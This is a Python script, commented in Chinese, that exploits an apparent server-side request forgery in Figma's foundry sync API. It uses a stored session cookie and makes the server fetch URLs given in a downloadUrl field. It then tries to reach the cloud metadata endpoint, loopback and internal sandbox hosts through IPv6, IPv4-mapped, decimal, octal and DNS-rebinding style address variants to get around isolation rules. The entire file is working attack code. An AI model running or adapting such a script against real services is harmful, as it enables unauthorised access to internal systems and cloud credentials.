"""foundry sync downloadUrl SSRF 深化: 突破网络层 IPv4 隔离
假设: 网络层隔离规则可能只覆盖 IPv4 —— 测试 IPv6 / IPv4-mapped / 内部域名(sboxd自身)
对照组: httpbin(正常fetch) + 169.254.169.254(隔离基线)
目标结果: 任一内网/元数据地址返回内容(非 connect timeout) = 网络层隔离被绕过 = SSRF 升级
依据: _foundry_dl_ssrf.py 复现链已实测通过(参数全现成)
"""
import io, json, urllib.request, sys, re, base64
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CK = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
UID = "1667396392129259941"
PUB_KEY = "bv2nMIdFf4u3dESGail4sm"

def call(path, body, timeout=30):
    hdrs = {"User-Agent": UA, "Accept": "application/json",
            "Origin": "https://www.figma.com", "Referer": "https://www.figma.com/",
            "Content-Type": "application/json", "Cookie": CK,
            "X-Figma-Org-ID": "", "X-Figma-Team-ID": "",
            "X-Figma-Client-Lifecycle-ID": "probe",
            "Tsid": "probe", "X-Referer-Service": "web",
            "X-Figma-User-ID": UID, "X-Figma-File-Key": PUB_KEY}
    data = json.dumps(body).encode()
    req = urllib.request.Request("https://www.figma.com" + path, data=data, headers=hdrs, method="POST")
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode(errors='replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace')
    except Exception as e:
        return 0, f"!! {type(e).__name__} {str(e)[:80]}"

def ssrf_fetch(url, tag, sbox):
    """downloadUrl=fetch 到 VFS,再读回; 返回 (sync状态, 回显内容)"""
    fname = "code/DP_%s.txt" % tag
    body = {"vfsChangeByPath": {tag: {"type": "upsert",
            "entry": {"path": fname, "downloadUrl": url, "metadata": {"version": "1", "guid": "g1"}}}},
            "entrypointsByIdentifier": {}}
    st1, r1 = call("/api/cortex/foundry/sync", body, timeout=30)
    st2, snap = call("/api/cortex/foundry/fs-snapshot",
                     {"sboxdUrl": sbox, "path": "code/src/" + fname, "options": {"content": "snapshot"}}, timeout=30)
    content = ""
    for m in re.finditer(r'data: (\{.*?\})\n', snap, re.S):
        try:
            o = json.loads(m.group(1))
        except Exception:
            continue
        if o.get("type") == "fswatch/event" and o.get("content"):
            content = base64.b64decode(o["content"]).decode(errors='replace')
    # 判定: 内容非空/状态200 = 连接成功; !!Timeout/0 = 网络层隔离
    verdict = "REACHED" if content else ("TIMEOUT/FAIL" if "!!" in r1 or "!!" in snap else "EMPTY")
    print(f"[{tag}] {url}")
    print(f"    sync={st1} snapshot={st2} -> {verdict} | content({len(content)}): {content[:120].strip()}")
    return content

print("======== 拿 sandbox ========")
st, resp = call("/api/cortex/foundry/sandbox", {})
SBOX = json.loads(resp)["sboxdUrl"]
print("sandbox:", st, SBOX)

print("\n======== 对照组(验证链路正常+隔离基线) ========")
ssrf_fetch("https://httpbin.org/robots.txt", "ctrl_pub", SBOX)
ssrf_fetch("http://169.254.169.254/latest/meta-data/", "ctrl_imds", SBOX)

print("\n======== IPv6 组(绕过 IPv4 隔离规则) ========")
ssrf_fetch("http://[::1]/", "v6_loop", SBOX)
ssrf_fetch("http://[::1]:8080/", "v6_loop8080", SBOX)
ssrf_fetch("http://[fd00::1]/", "v6_ula", SBOX)
ssrf_fetch("http://[fe80::1]/", "v6_linklocal", SBOX)

print("\n======== IPv4-mapped IPv6 组(IMDS/loopback 的 IPv6 形式) ========")
ssrf_fetch("http://[::ffff:169.254.169.254]/latest/meta-data/", "v4m_imds", SBOX)
ssrf_fetch("http://[::ffff:127.0.0.1]/", "v4m_loop", SBOX)
ssrf_fetch("http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/", "v4m_imds2", SBOX)

print("\n======== 内部域名组(Figma 内部网络探针: 自己的 sboxd/app 服务) ========")
ssrf_fetch(SBOX + "/", "int_sboxd", SBOX)
ssrf_fetch(SBOX + "/api/health", "int_sboxd_health", SBOX)
ssrf_fetch(SBOX.replace("sboxd-", "app-") + "/", "int_appurl", SBOX)

print("\n======== 特殊编码变体组(字符串过滤绕过) ========")
ssrf_fetch("http://2130706433/", "dec_loop", SBOX)          # 127.0.0.1 decimal
ssrf_fetch("http://127.1/", "short_loop", SBOX)             # 127.0.0.1 short
ssrf_fetch("http://0177.0.0.1/", "oct_loop", SBOX)          # octal
ssrf_fetch("http://169.254.169.254.sslip.io/latest/meta-data/", "sslip_imds", SBOX)  # sslip.io DNS
